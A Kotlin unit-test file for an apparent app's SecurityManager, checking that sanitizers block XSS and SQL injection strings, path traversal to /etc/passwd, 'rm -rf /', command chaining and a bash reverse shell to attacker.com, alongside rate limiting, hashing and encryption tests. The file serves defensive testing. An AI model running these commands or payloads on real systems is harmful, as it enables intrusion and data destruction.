package com.claudecontext.localdev.service

import com.claudecontext.localdev.service.security.*
import org.junit.Assert.*
import org.junit.Before
import org.junit.Test

class SecurityManagerTest {

    private lateinit var securityManager: SecurityManager

    @Before
    fun setup() {
        securityManager = SecurityManager()
    }

    // --- Input Sanitization ---

    @Test
    fun `sanitizeInput passes normal text unchanged`() {
        val result = securityManager.sanitizeInput("Hello world, this is a normal message")
        assertEquals("Hello world, this is a normal message", result.sanitized)
        assertFalse(result.wasModified)
    }

    @Test
    fun `sanitizeInput strips script tags`() {
        val result = securityManager.sanitizeInput("<script>alert('xss')</script>Hello")
        assertFalse(result.sanitized.contains("<script>"))
        assertTrue(result.wasModified)
    }

    @Test
    fun `sanitizeInput blocks SQL injection`() {
        val result = securityManager.sanitizeInput("'; DROP TABLE users; --")
        assertFalse(result.sanitized.contains("DROP TABLE"))
        assertTrue(result.wasModified)
    }

    @Test
    fun `sanitizeInput enforces max length`() {
        val longInput = "a".repeat(100000)
        val result = securityManager.sanitizeInput(longInput)
        assertTrue(result.sanitized.length <= 50000)
    }

    // --- File Path Sanitization ---

    @Test
    fun `sanitizeFilePath allows normal paths`() {
        val result = securityManager.sanitizeFilePath("/home/user/project/src/Main.kt")
        assertEquals("/home/user/project/src/Main.kt", result.sanitized)
        assertFalse(result.wasModified)
    }

    @Test
    fun `sanitizeFilePath blocks path traversal`() {
        val result = securityManager.sanitizeFilePath("../../etc/passwd")
        assertFalse(result.sanitized.contains(".."))
        assertTrue(result.wasModified)
    }

    @Test
    fun `sanitizeFilePath removes null bytes`() {
        val result = securityManager.sanitizeFilePath("/home/user/file\u0000.txt")
        assertFalse(result.sanitized.contains("\u0000"))
    }

    // --- Shell Command Sanitization ---

    @Test
    fun `sanitizeShellCommand allows safe commands`() {
        val result = securityManager.sanitizeShellCommand("ls -la src/")
        assertEquals("ls -la src/", result.sanitized)
        assertFalse(result.wasModified)
    }

    @Test
    fun `sanitizeShellCommand blocks rm rf root`() {
        val result = securityManager.sanitizeShellCommand("rm -rf /")
        assertTrue(result.wasModified)
        assertTrue(result.warnings.isNotEmpty())
    }

    @Test
    fun `sanitizeShellCommand blocks command chaining`() {
        val result = securityManager.sanitizeShellCommand("ls; rm -rf /")
        assertTrue(result.wasModified)
    }

    @Test
    fun `sanitizeShellCommand blocks reverse shell`() {
        val result = securityManager.sanitizeShellCommand("bash -i >& /dev/tcp/attacker.com/4444 0>&1")
        assertTrue(result.wasModified)
    }

    // --- Rate Limiting ---

    @Test
    fun `checkRateLimit allows requests under limit`() {
        assertTrue(securityManager.checkRateLimit("test_endpoint"))
    }

    @Test
    fun `checkRateLimit blocks after exceeding limit`() {
        repeat(200) {
            securityManager.checkRateLimit("flood_endpoint")
        }
        assertFalse(securityManager.checkRateLimit("flood_endpoint"))
    }

    @Test
    fun `checkRateLimit different endpoints are independent`() {
        repeat(200) {
            securityManager.checkRateLimit("endpoint_a")
        }
        assertTrue(securityManager.checkRateLimit("endpoint_b"))
    }

    // --- Audit Logging ---

    @Test
    fun `logAudit creates entry`() {
        val initialCount = securityManager.state.value.auditLogCount
        securityManager.logAudit(AuditAction.API_CALL, "chat", "test call")
        assertTrue(securityManager.state.value.auditLogCount > initialCount)
    }

    @Test
    fun `logAudit includes correct action type`() {
        securityManager.logAudit(AuditAction.AUTH_LOGIN, "login", "user logged in")
        val logs = securityManager.getAuditLogs()
        assertTrue(logs.any { it.action == AuditAction.AUTH_LOGIN })
    }

    // --- Secure Token ---

    @Test
    fun `generateSecureToken returns unique tokens`() {
        val token1 = securityManager.generateSecureToken()
        val token2 = securityManager.generateSecureToken()
        assertNotEquals(token1, token2)
    }

    @Test
    fun `generateSecureToken returns non-empty string`() {
        val token = securityManager.generateSecureToken()
        assertTrue(token.isNotBlank())
    }

    // --- Password Hashing ---

    @Test
    fun `hashPassword is deterministic`() {
        val hash1 = securityManager.hashPassword("password123")
        val hash2 = securityManager.hashPassword("password123")
        assertEquals(hash1, hash2)
    }

    @Test
    fun `hashPassword different passwords produce different hashes`() {
        val hash1 = securityManager.hashPassword("password1")
        val hash2 = securityManager.hashPassword("password2")
        assertNotEquals(hash1, hash2)
    }

    @Test
    fun `hashPassword output is not plaintext`() {
        val hash = securityManager.hashPassword("mypassword")
        assertNotEquals("mypassword", hash)
    }

    // --- Encryption ---

    @Test
    fun `encrypt produces non-null output`() {
        val encrypted = securityManager.encrypt("sensitive data")
        assertNotNull(encrypted)
    }

    @Test
    fun `encrypt output differs from input`() {
        val input = "my api key sk-1234"
        val encrypted = securityManager.encrypt(input)
        assertNotEquals(input, encrypted)
    }

    @Test
    fun `decrypt recovers original data`() {
        val original = "sk-ant-api03-secret-key-here"
        val encrypted = securityManager.encrypt(original)
        assertNotNull(encrypted)
        val decrypted = securityManager.decrypt(encrypted!!)
        assertEquals(original, decrypted)
    }
}
